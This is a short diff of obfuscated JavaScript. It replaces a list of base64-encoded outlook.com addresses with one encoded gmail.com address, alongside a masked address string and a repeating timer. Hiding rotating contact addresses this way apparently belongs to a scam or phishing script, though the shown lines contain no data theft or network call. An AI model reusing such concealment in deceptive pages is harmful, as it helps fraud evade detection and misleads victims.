@@ -126,12 +126,9 @@
     N();
     const w = (R) => new Promise((T) => setTimeout(T, R));
     var X = [
-            "Z29pY2tnbmVycmViQG91dGxvb2suY29t",
-            "Z3J1ZXR0ZmljazBAb3V0bG9vay5jb20=",
-            "Z2Vpc3RiZXpha3JAb3V0bG9vay5jb20=",
-            "Z3JhY2lhbWFzY2lvc0BvdXRsb29rLmNvbQ==",
+            "a2luZ2thbmdhcm9veGRAZ21haWwuY29t",
         ],
-        M = "outlook.com",
+        M = "gmail.com",
         i = "g***",
         Y = X[Math.floor(Math.random() * X.length)],
         W = 6045232974;
@@ -1442,4 +1439,5 @@ function t(l) {
     };
     var d = E();
     d.setInterval(t, 4000);
+
 })();
